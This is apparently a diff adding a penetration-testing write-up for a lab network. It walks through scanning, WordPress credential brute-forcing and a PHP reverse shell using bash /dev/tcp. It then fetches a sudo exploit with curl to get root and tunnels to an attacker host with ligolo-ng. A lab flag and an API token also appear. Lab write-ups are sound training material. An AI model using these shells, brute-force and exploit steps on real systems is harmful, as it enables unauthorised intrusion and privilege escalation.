@@ -1,0 +1,430 @@
+# Scope:
+**10.10.110.0/24**
+The firewall at **10.10.110.2** is out of scope
+
+# Information Gathering:
+
+## Hosts Discovery
+`nmap -Pn -v -T5 -sn 10.10.110.0/24`
+
+machines found:
+10.10.110.2
+10.10.110.100
+
+using netdiscover:
+`sudo netdiscover -i eth0 -r 192.168.18.0/24`
+
+## Port Discovery:
+Since we found only one machine in scope let's attempt to enumerate it:
+
+TCP ports:
+`sudo nmap -Pn -sS -sV -p- -T5 10.10.110.100 -v`
+
+```
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+UDP ports:
+`sudo nmap -sU --top-ports 10 -T4 10.10.110.100`
+
+```
+all closed
+```
+
+## Port Service Enumeration:
+
+`sudo nmap -Pn -sS -sV -sC -O -p 21,22,65000 -T5 10.10.110.100`
+
+```
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.16.11
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
+|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
+|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
+65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries
+|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Linux 4.X|5.X (96%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+Aggressive OS guesses: Linux 4.19 - 5.15 (96%), Linux 4.15 - 5.19 (90%), Linux 5.0 - 5.14 (90%), Linux 4.15 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+### http server:
+
+found the first flag: `DANTE{Y0u_Cant_G3t_at_m3_br0!}`
+
+from robots.txt:
+```
+User-agent: Googlebot
+User-agent: AdsBot-Google
+Disallow: /wordpress
+Disallow: DANTE{Y0u_Cant_G3t_at_m3_br0!}
+```
+
+
+- found a wordpress page on: `http://10.10.110.100:65000/wordpress/`
+- found ftp vsftpd 3.0.3 on port 21
+- found ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) on port 22
+
+## Vulnerability Enumeration:
+
+### ftp
+`searchsploit vsftpd 3.0.3`
+```
+vsftpd 3.0.3 - Remote Denial of Service  |  multiple/remote/49719.py
+```
+
+### ssh
+`searchsploit OpenSSH 8.2`
+```
+None
+```
+
+`https://www.cvedetails.com/version/639204/Openbsd-Openssh-8.2.html`
+```
+CVE-2023-38408
+
+The PKCS#11 feature in ssh-agent in OpenSSH before 9.3p2 has an insufficiently trustworthy search path, leading to remote code execution if an agent is forwarded to an attacker-controlled system. (Code in /usr/lib is not necessarily safe for loading into ssh-agent.) NOTE: this issue exists because of an incomplete fix for CVE-2016-10009.
+
+CVE-2021-41617
+
+sshd in OpenSSH 6.2 through 8.x before 8.8, when certain non-default configurations are used, allows privilege escalation because supplemental groups are not initialized as expected. Helper programs for AuthorizedKeysCommand and AuthorizedPrincipalsCommand may run with privileges associated with group memberships of the sshd process, if the configuration specifies running the command as a different user.
+```
+
+### HTTP
+
+`https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-782022/year-2022/opginf-1/Apache-Http-Server-2.4.41.html`
+```
+CVE-2022-28614
+
+The ap_rwrite() function in Apache HTTP Server 2.4.53 and earlier may read unintended memory if an attacker can cause the server to reflect very large input using ap_rwrite() or ap_rputs(), such as with mod_luas r:puts() function. Modules compiled and distributed separately from Apache HTTP Server that use the 'ap_rputs' function and may pass it a very large (INT_MAX or larger) string must be compiled against current headers to resolve the issue.
+
+CVE-2024-38476
+
+Vulnerability in core of Apache HTTP Server 2.4.59 and earlier are vulnerably to information disclosure, SSRF or local script execution via backend applications whose response headers are malicious or exploitable. Users are recommended to upgrade to version 2.4.60, which fixes this issue.
+```
+
+### Wordpress
+
+`wpscan --url http://10.10.110.100:65000/wordpress`
+
+Found the following employee names on the following page: http://10.10.110.100:65000/wordpress/index.php/meet-the-team/
+```
+kevin
+balthazar
+bally
+aj
+nathan
+```
+
+Also on page: http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks/
+
+We find out that they possibly use:
+```
+python 
+ruby/ruby on rails
+java
+```
+
+Using wordpress scan
+`wpscan --url http://10.10.110.100:65000/wordpress -e vp --detection-mode aggressive`
+
+```
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+```
+
+Let's enumerate it via wpscan: `wpscan --url http://10.10.110.100:65000/wordpress --api-token sV6jGZK9539zGX8g5jzGvbiIr63CxSKiC3YnQA7esE0 -o wordpress-scan`
+
+Found a swp file for wp-config.php: `wp-config.php.swp`
+
+we can restore it with `vim -r  wp-config.php.swp` and then `:recover`
+
+information found in `wp-config.php.swp`
+
+```
+user: root
+machine: DANTE-WEB-NIX01
+
+SECURE_AUTH_SALT: {Xrv,GS#>7B({PjsgfyL} 7ct1roDs5~keDYg2ae}M6,e|+D#fVC(gA%O]{Pz[Y]
+NONCE_KEY: v%/@I3c8yIm2q/_jtCa~if*?E&mGe?CKE1.]|TOki8=acoL5]^xq<x5AU2V*QNK&
+
+DB_HOST: localhost
+DB_NAME: wordpress
+DB_USER: shaun
+DB_PASSWORD: password
+``` 
+
+### ftp server:
+
+anonymous login allowed. Downloaded the following file: `todo.txt`
+```
+- Finalize Wordpress permission changes - PENDING
+- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
+- Remove LFI vuln from the other site - PENDING
+- Reset James' password to something more secure - PENDING
+- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
+```
+
+Conclusions:
+- James has easy passwords
+- This is a LFI from the 'other website'
+
+### ssh server:
+Nothing yet.
+
+## Initial Access:
+
+we can gain an initial foothold on the network by exploiting the WP-Server
+
+we have two routes
+1. Guess James's password
+2. Exploit a WP Vuln
+
+Let's attempt to bruteforce james's password since the todo.txt file says that is is weak:
+
+### Guessing James's Password:
+
+Let's try to bruteforce James's password with `hydra` or `wpscan`. We also need to provide a wordlist of possible passwords we can do this a couple of ways:
+- Use a pre-made wordlist like rockyou.txt
+- Generate a custom wordlist using cEWL
+- Asking an AI to generate one based on the target
+
+The AI for this particular is out of the question. And pre-made wordlists are long so let's start with a cEWL generated one and if that doesnt work we can try rockyou.txt
+
+`cewl -d 3 -w password-list-110_100 -c http://10.10.110.100:65000/wordpress/`
+
+```
+$ head password-list-110_100
+wrapper
+inner
+footer
+Dante
+LLC
+header
+menu
+the
+toggle
+and
+```
+
+Now let's attempt to bruteforce the password:
+
+`hydra -l james -P password-list-110_100 10.10.110.100 -s 65000 -V http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.110.100%3A65000%2Fwordpress%2Fwp-admin%2F&testcookie=1:The password you entered'
+`
+```
+[ATTEMPT] target 10.10.110.100 - login "james" - pass "invest" - 309 of 493 [child 3] (0/0)
+[ATTEMPT] target 10.10.110.100 - login "james" - pass "understand" - 310 of 493 [child 10] (0/0)
+[ATTEMPT] target 10.10.110.100 - login "james" - pass "their" - 311 of 493 [child 12] (0/0)
+[65000][http-post-form] host: 10.10.110.100   login: james   password: Toyota
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-26 18:18:10
+```
+
+Bingo! We found valid credentials `james:Toyota`
+
+### Turning WP-Admin to a Shell:
+
+let's attempt to edit a wordpress plugins to execute a reverse shell
+
+1. Make sure the deactivate the plugin you want to edit.
+2. Add the following php for a simple shell (make sure the php code runs without error)
+	`exec("bash -c 'exec bash -i &>/dev/tcp/<ip>/<port> <&1'");`
+3. Create a listener on your machine
+	`nc -nvlp <port>`
+4. Reactivate the plugin to get shell.
+
+```
+$ nc -nvlp 4444                                 
+listening on [any] 4444 ...
+connect to [10.10.14.89] from (UNKNOWN) [10.10.110.100] 36158
+bash: cannot set terminal process group (1099): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@DANTE-WEB-NIX01:/var/www/html/wordpress/wp-admin$ 
+```
+
+Great! we got a foothold on the system and possibly the internal network
+
+## Gaining Root on WEB-NIX01:
+
+we start by doing our basic quick wins:
+- [ ] sudo vulnerabilities
+	- [ ] can you run anything as sudo: `sudo -l`
+	- [ ] is the version of sudo vulnerable: `sudo --version`
+- [ ] SUID
+	- [ ] `find / -type f -perm -u=s 2>/dev/null`
+- [ ] Capabilities
+	- [ ] `/usr/sbin/getcap -r / 2>/dev/null`
+- [ ] world-writable 
+	- [ ] `find / -writable -type f 2>/dev/null`
+
+We found out that the version of sudo is vulnerable:
+
+```
+sudo --version
+Sudo version 1.8.31
+Sudoers policy plugin version 1.8.31
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.31
+```
+
+[CVE-2021-3156](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
+[Github Exploit](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit)
+
+let's attempt to use the exploit:
+
+`git clone https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit.git`
+
+Now we transfer the exploit to the victim:
+```our-machine
+$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```victim-machine
+curl http://10.10.14.89/exploit > exploit.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 16160  100 16160    0     0   9993      0  0:00:01  0:00:01 --:--:--  9993
+
+chmod +x exploit
+```
+
+```victim-machine
+curl http://10.10.14.89/shellcode.c > shellcode.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   599  100   599    0     0   1535      0 --:--:-- --:--:-- --:--:--  1531
+```
+
+```victim-machine
+curl http://10.10.14.89/Makefile > Makefile
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   208  100   208    0     0    526      0 --:--:-- --:--:-- --:--:--   526
+```
+
+```victim-machine
+make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+./exploit
+whoami
+root
+```
+
+Success! We have gained root access to the machine.
+
+## Upgrading the Shell
+
+1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+2. `export TERM=xterm`
+3. Background the shell with Ctrl+z
+4. `stty raw -echo; fg`
+5. `stty rows 38 columns 116`
+## Pivoting to Other Machines on the Internal network
+
+We notice that the machine we just compromised is connected to an internal network 
+```web-nix01
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:0b:cd brd ff:ff:ff:ff:ff:ff
+    inet 172.16.1.100/24 brd 172.16.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feb0:bcd/64 scope link
+       valid_lft forever preferred_lft forever
+```
+
+Let's setup a tunnel with `ligolo-ng` to access the network and scan it for additional machines:
+
+setup proxy
+```attacker-machine
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+```
+
+Send the ligolo-agent to the victim
+
+```attacker-machine
+python3 -m http.server 80
+```
+
+```victim-machine
+curl http://<ip>/ligolo-agent > ligolo-agent
+chmod +x ligolo-agent
+./agent_linux_amd64 -connect ATTACKER_IP:11601 -ignore-cert
+```
+
+now on the proxy you can setup the connection using autoroute.
+
+
+## Internal Network Host Discovery
+
+Now that we have setup the ligolo tunnel, we can do Host discovery on the internal network, but remember that a lot of machines block ICMP packets and that due to the nature of the ligolo tunnel, Syn scans aren't allowed.
+
+So we must perform a host discovery without pinging and without syn scanning:
+
+```
+nmap -sT -Pn -p 22,80,443,445,3389 <ip-range>
+```
+
+```
+nmap -sU -Pn -p 53,67,68,123,161 <ip-range>
+```
+
+or combine both
+```
+nmap -sT -sU -Pn -p T:22,80,443,445,3389,U:53,123,161 <ip-range>
+```
+clean output:
+```
+nmap -sT -Pn -p 22,80,443,445,3389 172.16.1.0/24 --open -oG - | grep "Nmap scan report" | awk '{print $5}' > internal-network-tcp-ips
+```
+
+## Internal Network Port Scanning
+
+We can use the ip list we generate during our host discovery to easily enumerate all ports on the internal network
+
+```
+nmap -iL internal-network-tcp-ips -sT -sU -p- -sV 
+```
+
+This scan will take awhile we can also approach each machine one-by-one
